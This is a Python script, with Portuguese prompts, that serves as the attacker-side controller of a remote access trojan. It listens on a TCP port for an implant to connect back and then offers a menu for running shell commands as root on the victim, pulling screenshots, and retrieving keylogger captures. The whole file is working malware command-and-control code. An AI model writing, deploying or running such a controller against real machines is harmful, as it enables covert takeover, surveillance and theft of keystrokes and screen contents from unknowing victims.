import socket
import os
import subprocess
from time import sleep

def command(conn):
    print("Envie um comando a ser executado ou 'quit' para encerrar a conexão")
    while True:        
        cmd = input("root@vm-ubuntu# ")
        conn.sendall(cmd.encode('utf-8'))
        received_msg = ""
        if cmd.strip() == "quit":
            break
        else:
            while True:
                data = conn.recv(1024)
                if not data:
                    # If there is no data, the connection has been terminated
                    print("Conexão encerrada pelo servidor.")
                    break
                elif data.decode('utf-8') == "END\n\x00":
                    # Message ending
                    print(received_msg)
                    break
                elif data.decode('utf-8').endswith("\x00END\n\x00"):
                    # Message ending
                    received_msg += data.decode('utf-8').rstrip('END\n\x00')
                    # Displays the received message
                    print(received_msg)
                    break
                # Decodes the received message
                received_msg += data.decode('utf-8').rstrip('\x00')
                

def screenshot(file):
    received_msg = ""
    while True:
        data = conn.recv(1024)
        if not data:
            # If there is no data, the connection has been terminated
            print("Conexão encerrada pelo servidor.")
            break
        elif data.decode('utf-8') == "END\n\x00":
            # Message ending
            break
        elif data.decode('utf-8').endswith("\x00END\n\x00"):
            # Message ending
            received_msg += data.decode('utf-8').rstrip('\x00END\n\x00')
            # Writes the received message
            file.write(received_msg)
            sleep(3)
            break
        # Decodes the received message
        received_msg += data.decode('utf-8').rstrip('\x00')
    print("Screenshot finalizado com sucesso.")

def keyboard():
    data = conn.recv(1024)
    if not data:
        # If there is no data, the connection has been terminated
        print("Não há input de teclado.")
    # Decodes and displays the received message
    received_msg = data.decode('utf-8').rstrip('\n\x00')
    print(received_msg)

# Sets the IP address and port on which the host will wait for the connection
HOST = 'HOST_IP'
PORT = HOST_PORT

# Creates a TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Associates the socket with the specified IP address and port
sock.bind((HOST, PORT))

# Wait a connection
sock.listen(1)
print(">>> Aguardando conexão... <<<")

# Accepts the connection and gets the socket object from the established connection
conn, addr = sock.accept()
print(">>> Conexão estabelecida com:", addr, "<<<")

i = 0
j = 0

# Main loop for sending and receiving messages
while True:
    print(">>> Escolha uma das seguintes opções <<<")
    print("[1] Enviar comandos de console")
    print("[2] Tirar screenshot (não compatível com interface gráfica)")
    print("[3] Tirar screenshot (interface gráfica em espaço de usuário)")
    print("[4] Recuperar inputs de usuário")
    print("[5] Encerrar conexão")

    try:
        num = int(input())
        if num != 1 and num != 2 and num != 3 and num != 4 and num != 5:
            raise ValueError
    except ValueError:
        print("Invalid input. Please enter a valid integer.")
        continue
    
    # Shell command
    if num == 1:
        cmd = "1\n"
        conn.sendall(cmd.encode('utf-8'))
        command(conn)
    # PPM screenshot (not compatible with graphic interfce)
    elif num == 2:
        file_path = "./temp.txt"
        screenshot_path = f"./screenshot{i}.ppm"
        i += 1
        cmd = "2\n"
        conn.sendall(cmd.encode('utf-8'))
        file = open(file_path, 'a')
        screenshot(file)
        file.close()
        hexdump_command = "xxd -r -p " + file_path + " > " + screenshot_path
        subprocess.Popen(hexdump_command, shell=True).communicate()
        os.remove(file_path)
    # PNG screenshot
    elif num == 3:
        file_path = "./temp2.txt"
        screenshot_path = f"./screenshot{j}.png"
        j += 1
        cmd = "3\n"
        conn.sendall(cmd.encode('utf-8'))
        user = input("Escreva o nome do usuário normal: ")
        conn.sendall(user.encode('utf-8'))
        file = open(file_path, 'a')
        screenshot(file)
        file.close()
        hexdump_command = "xxd -r -p " + file_path + " > " + screenshot_path
        subprocess.Popen(hexdump_command, shell=True).communicate()
        os.remove(file_path)
    # Keylogger
    elif num == 4:
        cmd = "4\n"
        conn.sendall(cmd.encode('utf-8'))
        print(">>> Recuperando keylogger... <<<")
        keyboard()
        print(">>> Keylogger recuperado. <<<")
    # End connection
    else:
        print(">>> Encerrando conexão <<<")
        cmd = "5\n"
        conn.sendall(cmd.encode('utf-8')) 
        break

sleep(1)

# Close the connection and the socket
conn.close()
sock.close()
